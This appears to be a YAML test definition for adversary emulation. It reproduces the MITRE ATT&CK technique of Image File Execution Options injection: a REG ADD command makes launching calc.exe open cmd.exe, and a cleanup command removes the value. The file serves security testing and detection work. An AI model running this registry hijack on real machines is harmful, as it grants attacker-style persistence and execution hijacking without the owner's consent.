- id: 94eb801c-ad7a-5b9a-86fe-4d7ef29f681e
  name: Soumaia ART Tests - IFEO Add Debugger
  description: Leverage Global Flags Settings (requires elevation)
  tactic: privilege-escalation
  technique:
    attack_id: T1546.012
    name: 'Event Triggered Execution: Image File Execution Options Injection'
  platforms:
    windows:
      cmd:
        command: |-
          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /d "C:\Windows\System32\cmd.exe"
        cleanup: |-
          reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /f >nul 2>&1
